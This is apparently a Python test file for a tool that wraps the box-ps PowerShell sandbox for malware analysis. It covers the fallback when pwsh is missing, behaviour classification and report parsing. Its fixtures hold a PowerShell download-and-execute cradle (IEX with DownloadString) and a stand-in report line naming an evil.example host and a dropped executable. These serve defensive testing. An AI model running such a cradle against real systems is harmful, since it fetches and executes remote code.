"""Tests for the box-ps PowerShell-sandbox wrapper (graceful without pwsh)."""

from __future__ import annotations

import json

from docutracex.parsers import boxps


def test_unavailable_without_provisioning(monkeypatch) -> None:
    monkeypatch.setattr(boxps.settings, "pwsh_executable", lambda: None)
    monkeypatch.setattr(boxps.settings, "boxps_script", lambda: None)
    assert boxps.boxps_status()["available"] is False
    res = boxps.analyze("Invoke-WebRequest http://x")
    assert res["available"] is False and res["findings"] == []
    assert res["error"] and "provision" in res["error"]


def test_classify_behaviours() -> None:
    assert boxps._classify("network download")[0] == "boxps_network"
    assert boxps._classify("code_execution start_process")[0] == "boxps_exec"
    assert boxps._classify("file_system writeallbytes")[0] == "boxps_file"
    assert boxps._classify("reflection assembly load")[0] == "boxps_inject"
    assert boxps._classify("nothing interesting") is None


def test_load_report_parses_actions_and_layers(tmp_path) -> None:
    out = tmp_path / "out"
    out.mkdir()
    (out / "layers.ps1").write_text("IEX (New-Object Net.WebClient).DownloadString('http://x')")
    (out / "report.json").write_text(json.dumps({
        "Actions": [
            {"Behaviors": ["network"], "Line": "DownloadString http://evil.example"},
            {"Behaviors": ["file_system"], "Line": "WriteAllBytes drop.exe"},
        ]
    }))
    report = boxps._load_report(out)
    assert len(report["actions"]) == 2
    assert "DownloadString" in report["layers"]
    assert report["raw"]["Actions"][0]["Behaviors"] == ["network"]
